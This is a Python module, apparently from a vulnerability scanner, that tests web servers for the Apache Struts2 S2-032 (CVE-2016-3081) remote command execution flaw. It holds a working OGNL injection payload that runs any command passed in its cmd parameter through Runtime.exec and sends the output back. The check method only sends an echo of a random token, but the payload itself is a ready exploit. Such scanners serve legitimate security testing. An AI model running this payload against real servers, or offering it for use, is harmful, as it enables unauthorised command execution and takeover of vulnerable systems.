#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_032_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-032漏洞,又名CVE-2016-3081漏洞',
            'description': 'Struts2 S2-032漏洞可执行任意命令,影响范围为: Struts 2.3.20 - Struts Struts 2.3.28 (2.3.20.3和2.3.24.3除外)',
            'date': '2016-04-19',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.payload = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd={cmd}'''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
            if self.capta in await check_req.text() and len(await check_req.text()) < 100:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_032 = S2_032_BaseVerify('http://localhost:8080/s2_032_war_exploded/index.action')
    print(S2_032.check())

